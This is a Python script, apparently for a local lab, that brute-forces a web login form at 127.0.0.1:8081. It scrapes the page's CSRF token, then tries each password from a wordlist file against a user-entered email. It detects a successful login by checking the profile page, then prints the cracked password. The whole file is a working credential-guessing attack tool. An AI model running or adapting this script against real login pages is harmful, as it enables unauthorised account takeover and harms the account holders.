import requests
from bs4 import BeautifulSoup
from colorama import Fore
session = requests.Session()
login_url = 'http://127.0.0.1:8081/login'
email = input(Fore.MAGENTA+'Enter email : ')
attempts = 0
passwords = []
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
}
response = session.get(login_url, headers=headers)

soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
with open('passwords.txt','r') as file:
    lines = file.read().splitlines()
    for line in lines:
        passwords.append(line)

for password in passwords:
    attempts+=1
    form_data = {
        'email': email,
        'password': password,
        'submit': 'Log in',
        'csrf_token': csrf_token
    }
    response = session.post(login_url, data=form_data, headers=headers)
    req = session.get('http://127.0.0.1:8081/profile').content
    if "readonly" in str(req):
        exit(Fore.GREEN+f'Password Catched after {attempts} attempts!\nPassword is : {password}\n')
    else:
        print(Fore.RED+f'{password} : Bad Password')